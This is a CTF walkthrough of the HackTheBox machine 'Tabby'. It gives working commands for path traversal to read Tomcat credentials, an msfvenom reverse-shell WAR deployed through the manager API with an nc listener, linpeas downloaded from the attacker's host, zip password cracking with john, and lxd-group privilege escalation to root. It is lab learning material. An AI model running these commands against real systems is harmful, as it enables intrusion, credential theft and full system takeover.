#HackTheBox
#Tabby

Cool, let's attempt to root another box, I hope I struggle less after spending some time on TryHackMe.

	kali@kali:~/CTF/HTB/Machines/Tabby$ sudo nmap -sV -O -sS 10.10.10.194 

	Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-29 01:02 EDT
	Nmap scan report for 10.10.10.194
	Host is up (0.13s latency).
	Not shown: 997 closed ports
	PORT     STATE SERVICE VERSION

	22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
	80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
	8080/tcp open  http    Apache Tomcat

	No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
	TCP/IP fingerprint:
	OS:SCAN(V=7.80%E=4%D=6/29%OT=22%CT=1%CU=33941%PV=Y%DS=2%DC=I%G=Y%TM=5EF9762
	OS:0%P=x86_64-pc-linux-gnu)SEQ(SP=FC%GCD=1%ISR=FE%TI=Z%CI=Z%II=I%TS=A)OPS(O
	OS:1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11N
	OS:W7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R
	OS:=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%
	OS:RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y
	OS:%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R
	OS:%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=
	OS:40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S
	OS:)

	Network Distance: 2 hops
	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

	OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	Nmap done: 1 IP address (1 host up) scanned in 48.51 seconds

#Tomcat version is Apache Tomcat/9.0.31 (Ubuntu)

Alright, we got an http server running on port 80 and ssh running on the default port. Also, Apache Tomcat on port 8080.

Let's check the website out. Megahosting, hmmm. 
Let's try to enumerate directories with dirsearch, I'll attempt to use the default list first, and then one from the SecLists repository.

	kali@kali:~/CTF/HTB/Machines/Tabby$ /home/kali/tools/dirsearch/dirsearch.py -u http://10.10.10.194 -e default

	 _|. _ _  _  _  _ _|_    v0.3.9
	(_||| _) (/_(_|| (_| )

	Extensions: default | HTTP method: get | Threads: 10 | Wordlist size: 6123

	Error Log: /home/kali/tools/dirsearch/logs/errors-20-06-29_01-27-27.log

	Target: http://10.10.10.194

	[01:27:29] Starting: 
	[01:27:43] 403 -  277B  - /.ht_wsr.txt
	[01:27:43] 403 -  277B  - /.htaccess-local
	[01:27:43] 403 -  277B  - /.htaccess-dev
	[01:27:43] 403 -  277B  - /.htaccess-marco
	[01:27:43] 403 -  277B  - /.htaccess.orig
	[01:27:43] 403 -  277B  - /.htaccess.sample
	[01:27:44] 403 -  277B  - /.htaccess.bak1
	[01:27:44] 403 -  277B  - /.htaccess.save
	[01:27:44] 403 -  277B  - /.htaccess.old
	[01:27:44] 403 -  277B  - /.htaccess.txt
	[01:27:44] 403 -  277B  - /.htaccess_extra
	[01:27:44] 403 -  277B  - /.htaccess.BAK
	[01:27:44] 403 -  277B  - /.htaccess_orig
	[01:27:44] 403 -  277B  - /.htaccess_sc
	[01:27:44] 403 -  277B  - /.htaccessOLD
	[01:27:44] 403 -  277B  - /.htaccessOLD2
	[01:27:44] 403 -  277B  - /.htaccessBAK
	[01:27:44] 403 -  277B  - /.htaccess~
	[01:27:44] 403 -  277B  - /.hta
	[01:27:44] 403 -  277B  - /.htpasswd_test
	[01:27:45] 403 -  277B  - /.htpasswds
	[01:27:45] 403 -  277B  - /.htgroup
	[01:27:45] 403 -  277B  - /.htpasswd-old
	[01:27:45] 403 -  277B  - /.htusers
	[01:28:40] 301 -  313B  - /assets  ->  http://10.10.10.194/assets/
	[01:29:15] 200 -  766B  - /favicon.ico 	
	[01:29:17] 301 -  312B  - /files  ->  http://10.10.10.194/files/
	[01:29:17] 403 -  277B  - /files/
	[01:29:32] 200 -   14KB - /index.php
	[01:29:32] 200 -   14KB - /index.php/login/
	[01:30:13] 200 -    2KB - /Readme.txt
	[01:30:19] 403 -  277B  - /server-status/
	[01:30:19] 403 -  277B  - /server-status

	Task Completed

The default list brought back a pretty good result. SecLists pretty much shows a bit less than this one.
There are two interesting directories here, files and assets, we can't access these yet.

I have found something on the site. It looks like the site takes a parameter called file on the news section like this:

	http://10.10.10.194/news.php?file=statement

This can be useful. 

I'll try to fuzz this and see if I can get a useful file. So far it seems to be the only way to go.

I was sucessful in fuzzing the parameter, however I can't access any of the files on the server directly, probably because of the path the server itself is in. So I'll need to find the proper path to access any of the tomcat files, which can provide me with credentials. I was only able to see /etc/passwd and /etc/crontab neither seem to be that useful. 

Yeez! It took me a while but I managed to find something useful. The tomcat-users.xml file. I had to install the same tomcat version on my local machine and look where the file is located by default. Thanks to a few nudges I managed to find the file and learned that it is a nice target if I ever encounter tomcat servers again.

	root@kali:/opt# find / -iname tomcat-users.xml
	/etc/tomcat9/tomcat-users.xml
	/usr/share/tomcat9/etc/tomcat-users.xml

I used curl to get the files:

	curl 10.10.10.194/news.php?file=../../../../../../usr/share/tomcat9/etc/tomcat-users.xml

There may be other useful files on the same directory, I'll save their contents on the folder where these notes are located. tomcat-users.xml has plain text credentials in it.

	<role rolename="admin-gui"/>
	<role rolename="manager-script"/>
  	<user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/>

  	user: tomcat
  	password: $3cureP4s5w0rd123!

Now I have to learn how I can leverage this information. I don't think this will work but I guess it's worth trying to ssh with these creds.

Logging in to the webapp manager of course. However, remote access seems to be blocked, I'll have to work around this. 

Got it. The manager-gui is blocked from remote access, however, the manager-script is not.

So, this means we can deploy stuff from the command line. We can generate a reverse shell with java.

	msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.147 LPORT=4444 -f war > shell.war

And then upload it with the admin-script. Pay attention to the parameters and the quotes. 

	curl -u 'tomcat':'$3cureP4s5w0rd123!' -T shell.war 'http://10.10.10.194:8080/manager/text/deploy?path=/shell'

I tried uploading a php shell but tomcat just stops it and it won't run.

We can list the deployed files on the server like this:

	curl -u 'tomcat':'$3cureP4s5w0rd123!' http://10.10.10.194:8080/manager/text/list 

	OK - Listed applications for virtual host [localhost]
	/:running:0:ROOT
	/shell.war:running:0:shell.war
	/stefansux:running:1:stefansux
	/phpl:stopped:0:phpl.war
	/hacked:running:0:hacked
	/docs:running:0:/usr/share/tomcat9-docs/docs
	/body.war:running:1:body.war
	/examples:running:0:/usr/share/tomcat9-examples/examples
	/ate.war:running:0:ate.war
	/host-manager:running:2:/usr/share/tomcat9-admin/host-manager
	/shell:running:0:shell
	/kk.war:running:1:kk.war
	/manager:running:0:/usr/share/tomcat9-admin/manager
	/php:stopped:0:php.war

We see our shell is running in the server, now we just need to call it. We can use the web browser or curl. 
First we set our listener on the local machine:

	kali@kali:~/CTF/HTB/Machines/Tabby$ nc -nvlp 4444
	listening on [any] 4444 ...

And then call the shell

	curl 'http://10.10.10.194:8080/shell/'

We get a connection and now we should be able to run commands.

	kali@kali:~/CTF/HTB/Machines/Tabby$ nc -nvlp 4444
	listening on [any] 4444 ...
	connect to [10.10.14.147] from (UNKNOWN) [10.10.10.194] 53258
	id
	uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)

Let's see if we can spawn a shell with python

	python3 -c 'import pty; pty.spawn("/bin/bash")'

	tomcat@tabby:/var/lib/tomcat9$ 

Note: I had to connect several times to the machine because it kept resetting over and over, the whole shell process can be scripted like this to make things faster:

Terminal 1:

	shell_name=shell.war
	path=shell
	ip4=$(/sbin/ip -o -4 addr list tun0 | awk '{print $4}' | cut -d/ -f1)
	echo $ip4
	sudo rm -rf $shell_name 
	msfvenom -p java/jsp_shell_reverse_tcp LHOST=$ip4 LPORT=4444 -f war > $shell_name -i 25
	curl -u 'tomcat':'$3cureP4s5w0rd123!' -T $shell_name 'http://10.10.10.194:8080/manager/text/deploy?path=/shell'
	curl -u 'tomcat':'$3cureP4s5w0rd123!' http://10.10.10.194:8080/manager/text/list 
	curl http://10.10.10.194:8080/$path/

Terminal 2:

	nc -nvlp 4444

	Paste or type after a connection is recieved to spawn a shell:

	python -c 'import pty; pty.spawn("/bin/bash")'

Changing the value of the path variable is encouraged, so your terminal will not overwrite someone else's file (in case they uploaded their own shell to a path named /shell) and viceversa.

There. Now, we could use Linpeas to enumerate the machine in order to get user access. Let's setup a web server locally so we can get the script into the box.

	sudo python3 -m http.server 80

On tabby, let's request the file to our machine, we will put it in /tmp/ because we have write access there.

	cd /tmp
	wget 10.10.14.147/linpeas.sh
	chmod +x linpeas.sh
	./linpeas.sh

We need to use chmod to give linpeas execute permissions.

We can then let linpeas do its thing and look for interesting stuff on the server. (linpeasout.txt)
Note: ALWAYS CHECK THE BACKUPS SECTION OF LINPEAS

I spent a lot of time trying to get user access by other means, and I completely missed this part of the linpeas output.

	[+] Backup files?
	-rw-r--r-- 1 ash ash 8716 Jun 16 13:42 /var/www/html/files/16162020_backup.zip
	-rw-r--r-- 1 root root 2743 Apr 23 07:35 /etc/apt/sources.list.curtin.old

I found this thanks to a nudge from a reddit user. It's a backup file, of course, owned by none other than ash.
It seems to be password protected, so , we are going to have to use john.

We need to get the file on our machine first, so we do what we did to get linpeas on the tabby machine, but this time, the opposite way.

Start web server on tabby:
	
	sudo python3 -m http.server 80

Request the zip file on our machine:

	wget 10.10.10.194/16162020_backup.zip

Once we have the file, we can use zip2john to get a hash from the zip file, and then use the rockyou wordlist with john to see if we can get the password.

	zip2john 16162020_backup.zip > zip.hash 

	sudo john --wordlist=/home/kali/tools/rockyou.txt zip.hash 

	Using default input encoding: UTF-8
	Loaded 1 password hash (PKZIP [32/64])
	Will run 2 OpenMP threads
	Press 'q' or Ctrl-C to abort, almost any other key for status
	admin@it         (16162020_backup.zip)
	1g 0:00:00:00 DONE (2020-07-03 03:51) 1.010g/s 10463Kp/s 10463Kc/s 10463KC/s adnc153..adilizinha

The password is 'admin@it'.

I thought at first I was supposed to look for credentials in the files, I did not exactly think that ash would reuse passwords, that's embarrasing. I'm glad I didn't spend much time on that 'rabbit hole'.

We got user access! Cool. The user flag is in the home directory.

Great, now lets get root. Sudo version is 1.8.31 , let's look at home and see if we can find something.

	ash@tabby:~/snap/lxd/14804/.config/lxc$ ls -l /home/ash
	ls -l /home/ash
	total 12
	drwxrwxr-x 2 ash ash 4096 Jul  6 00:23 secsol
	drwxr-xr-x 3 ash ash 4096 Jul  6 00:23 snap
	-rw-r----- 1 ash ash   33 Jul  6 00:20 user.txt

secsol looks interesting. 

The environment allows us to perform privilege escalation through lxd, it turns out ash is member of a group called 'lxd'.
This acticle explains how we can do it.

https://www.hackingarticles.in/lxd-privilege-escalation/

We install lxd alpine builder locally and build an alpine image from scratch.

	git clone https://github.com/saghul/lxd-alpine-builder.git

	cd lxd-alpine-builder

	sudo bash build-alpine

Once we have done that, we copy our generated file to the box.

	wget 10.10.14.197/alpine-v3.12-x86_64-20200625_0040.tar.gz
	lxc image import ./alpine-v3.12-x86_64-20200625_0040.tar.gz --alias myimage
	lxc image list
	lxc init myimage ethicalhacs -c security.privileged=true
	lxc config device add ethicalhacs mydevice disk source=/ path=/mnt/root recursive=true
	lxc start ethicalhacs
	lxc exec ethicalhacs /bin/sh
	cd /mnt/root/root

There.

	#id
	uid=0(root) gid=0(root)

The root flag will be located at /mnt/root


This script can also perform privesc.

https://www.exploit-db.com/exploits/46978

Although one may need to type the following commands after running it with an image we have sent to the box.

		lxc stop privesc
		lxc start privesc
	  	lxc exec privesc sh 
	